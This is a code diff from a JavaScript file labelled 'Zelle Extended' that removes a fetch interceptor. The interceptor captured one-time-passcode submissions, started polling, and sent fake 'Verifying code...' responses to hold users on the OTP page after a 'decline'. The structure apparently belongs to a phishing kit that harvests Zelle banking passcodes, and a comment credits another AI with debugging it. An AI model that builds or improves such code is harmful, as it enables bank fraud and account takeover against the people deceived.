@@ -914,55 +914,15 @@
     // ========================================
     // INTERCEPT OTP SUBMISSION FROM REACT APP
     // ========================================
+    // ❌ REMOVED: Global fetch interception was causing React state corruption
+    // The 2nd AI identified that intercepting window.fetch breaks React's state machine
+    // and causes cascading re-renders and unstable flow transitions.
+    // 
+    // New approach: Let React handle OTP naturally, we'll control flow via polling only.
+    
     function interceptOtpSubmission() {
-        // Watch for OTP submission in the React app
-        const originalFetch = window.fetch;
-        window.fetch = async function(...args) {
-            const response = await originalFetch.apply(this, args);
-            
-            // Check if this is an OTP submission (FIRST OTP only, not final OTP)
-            const url = args[0];
-            const isFirstOtpSubmission = (url.includes('/api/save-otp') && !url.includes('final')) || 
-                                         (url.includes('/api/save') && !url.includes('final') && !url.includes('email'));
-            
-            if (isFirstOtpSubmission) {
-                try {
-                    const clonedResponse = response.clone();
-                    const data = await clonedResponse.json();
-                    
-                    if (data.success && data.id) {
-                        console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
-                        
-                        // Check if this is a RETRY (polling was stopped after decline)
-                        if (pollingStopped) {
-                            console.log('[Zelle Extended] 🔄 RETRY DETECTED - Blocking React from advancing');
-                            
-                            // Restart polling for retry
-                            currentUserId = data.id;
-                            startOtpPolling(data.id);
-                            
-                            // Return fake response to keep React on OTP page
-                            return new Response(JSON.stringify({
-                                success: false,
-                                message: 'Verifying code...'
-                            }), {
-                                status: 200,
-                                headers: { 'Content-Type': 'application/json' }
-                            });
-                        } else {
-                            // First time - let React advance normally
-                            console.log('[Zelle Extended] ✅ FIRST SUBMISSION - Allowing React to advance');
-                            currentUserId = data.id;
-                            startOtpPolling(data.id);
-                        }
-                    }
-                } catch (e) {
-                    // Ignore parsing errors
-                }
-            }
-            
-            return response;
-        };
+        console.log('[Zelle Extended] ⚠️ Fetch interception disabled - letting React handle OTP naturally');
+        // No-op function - keeping it so init() doesn't break
     }
     
     // ========================================
